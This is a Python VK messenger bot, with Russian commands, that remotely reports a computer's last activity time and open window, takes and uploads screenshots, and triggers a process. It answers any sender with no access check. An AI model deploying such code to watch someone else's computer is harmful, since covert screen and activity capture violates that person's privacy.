import features
from vk_api import VkApi, VkUpload
import random
import vk
import requests
from vk_api.keyboard import VkKeyboard
import status

vk = VkApi(token='')

def uploadPhoto(image):
	upload = VkUpload(vk)
	photo = upload.photo_messages(image)
	owner_id = photo[0]['owner_id']
	photo_id = photo[0]['id']
	access_key = photo[0]['access_key']
	attachment = f'photo{owner_id}_{photo_id}_{access_key}'
	return attachment
	
def keyboard():
	Keyboard = VkKeyboard
	key_main = Keyboard(one_time=False)
	key_main.add_button(label="Актив", color="primary")
	#key_main.add_line()
	key_main.add_button(label="Разбудить", color="primary")
	key_main.add_line()
	key_main.add_button(label="Скрин", color="primary")
	key_main.add_button(label="Окно", color="primary")
	return Keyboard.get_keyboard(key_main)

def sendMSG(user_id, message, attachment=''):
	vk.method('messages.send', {'user_id': user_id, 'message': message, "attachment": attachment, "random_id": random.randint(0, 99999999999999999999999999), "keyboard": keyboard()})

def handle(user_id, text):
	if text == "актив":
		tmp = features.getStatus()
		msg = f"Последняя активность была {tmp} сек назад."
		sendMSG(user_id, msg)

	elif text == "разбудить":
		features.wake()
		msg = f"Процесс запущен."
		sendMSG(user_id, msg)

	elif text == "скрин":
		features.makeScreenshot()
		photo = uploadPhoto('random.jpg')
		sendMSG(user_id, '', photo)

	elif text == "окно":
		tmp = features.getWindow()
		msg = f"Сейчас октрыто:\n{tmp}"
		sendMSG(user_id, msg)

	elif text == "stop":
		pass

	elif len(text.split("фото ")) > 1:
		text = text.split("фото ")[1]
		features.randomPic(text)
		photo = uploadPhoto('image.png')
		sendMSG(user_id, '', photo)